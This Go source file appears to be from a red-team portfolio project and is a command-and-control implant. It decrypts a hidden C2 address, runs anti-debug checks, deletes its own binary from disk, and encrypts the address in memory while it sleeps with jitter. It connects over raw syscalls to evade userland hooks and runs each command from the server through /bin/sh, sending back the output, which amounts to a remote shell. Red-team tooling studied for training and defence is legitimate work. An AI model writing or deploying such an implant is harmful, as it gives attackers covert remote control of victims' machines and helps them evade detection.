package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"redteam-portfolio/pkg/c2"
	"redteam-portfolio/pkg/crypto"
	"redteam-portfolio/pkg/evasion"
	"runtime"
	"strings"
	"time"
)

const (
	encC2Addr = "9ec78be1f870e4a4dd37b2b183cad9bb36d0410f858e96230c1e39674e264a6a5cda8699f12577776cccf77bfe6a"
	encKey    = "c9e4737ac9b481b70809fc372d13ef97a921c5fea7bfd3773b10b8213986bef3"
	minJitter = 8
	maxJitter = 15
)

func main() {
	fmt.Printf("[IMPLANT] Starting on %s/%s\n", runtime.GOOS, runtime.GOARCH)

	// Anti-debug (macOS only when compiled natively with cgo)
	evasion.AntiDebug()

	// Decrypt C2 address at runtime
	c2Address, err := crypto.DecryptString(encC2Addr, encKey)
	if err != nil {
		fmt.Println("[IMPLANT] Decryption failed")
		return
	}

	// Remove binary from disk while process continues
	if len(os.Args) > 0 {
		os.Remove(os.Args[0])
		fmt.Println("[IMPLANT] Removed from disk")
	}

	// Derive memory encryption key and store C2 address in a secure buffer
	memKey := evasion.DeriveKey([]byte(encKey))
	secBuf, err := evasion.NewSecureBuffer(256)
	if err != nil {
		fmt.Println("[IMPLANT] Secure alloc failed")
		return
	}
	defer secBuf.Wipe()
	secBuf.Write([]byte(c2Address))

	for {
		addr := secBuf.String()
		session(addr)

		// Connection lost: lock memory, jitter sleep, unlock for next attempt
		jitter := time.Duration(minJitter+rand.Intn(maxJitter-minJitter)) * time.Second
		fmt.Printf("[IMPLANT] Sleeping %v (locked)\n", jitter)
		if err := secBuf.Sleep(memKey, jitter); err != nil {
			fmt.Printf("[IMPLANT] Sleep error: %v\n", err)
		}
	}
}

func session(c2Address string) {
	// Raw BSD socket via syscalls (bypasses userland hooks)
	conn, err := c2.DialRaw(c2Address)
	if err != nil {
		return
	}
	defer conn.Close()

	fmt.Println("[IMPLANT] Connected to C2")
	reader := bufio.NewReader(conn)

	for {
		conn.Write([]byte("ready\n"))

		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[IMPLANT] Connection lost")
			return
		}

		cmdLine = strings.TrimSpace(cmdLine)
		if cmdLine == "" {
			continue
		}

		out, err := exec.Command("/bin/sh", "-c", cmdLine).CombinedOutput()
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("error: %s\n%s\n", err.Error(), out)))
			continue
		}

		conn.Write(out)
		if !strings.HasSuffix(string(out), "\n") {
			conn.Write([]byte("\n"))
		}
	}
}
